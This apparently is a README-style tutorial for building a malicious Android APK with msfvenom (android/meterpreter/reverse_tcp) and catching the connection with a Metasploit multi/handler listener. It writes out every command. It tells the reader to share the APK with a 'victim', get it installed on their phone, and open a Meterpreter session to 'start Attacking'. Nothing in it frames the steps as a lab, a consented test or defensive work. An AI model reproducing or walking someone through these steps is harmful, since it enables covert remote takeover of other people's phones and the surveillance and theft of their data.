
### Step By Step Process To Create The Payload  :
**Run This command in Kali Terminal**
1. check The Kali Version
`uname -r`
2.  give Root permission
`sudo su ` 
enter Password and get Root permission
3. Now Check your IP Address (please Connect with internet before Run Commad )
`ip address`
4. open Second Terminal Run this Code 
`msfvenom -p android/meterpreter/reverse_tcp LHOST=<your IP address> LPORT=<choose Any port Number Greater than 8500>> /home/kali/payload.apk`

you are created One Apk file with payload. Apk Path : Home>kali>payload.apk 

5. Now share This Apk To the Victim And Install On That mobile 
6. **Start Exploitation**
Run `msfconsole` and press Enter
Now wait for 1 min your Meta-sploit freamwork is Load
7. Run `use exploit/multi/handler` f
8. or Designing of Hacking
`set payload android/meterpreter/reverse_tcp`
Set Your IP and Victim Port
10. `set LHOST <Your ip Address>`
11. `set LPORT <your choosen Port >`

Now run This command for verify Both LHOST and LPORT  `show`

12. Now if your Payload not Working set EXit commad
13. Run `set ExitOnSession false`
  **NOW RUN PAYLOAD**
15. `exploit -j`
Now Your Payload is successfull Work in Background OF victims Android

Now When Victim Install This Apk ,,  Session automatically Start..

16. Run `sessions -i` and see the **ID** of Active Session (Example : 1 , 2, 3....)
17.  Now Run `sesssion -i <ID>`  and start Attacking
18. For performing Attack Run `help` and All commands you can Apply for Attack

**Thanks for Visiting @Yuvrajchauhan457  **










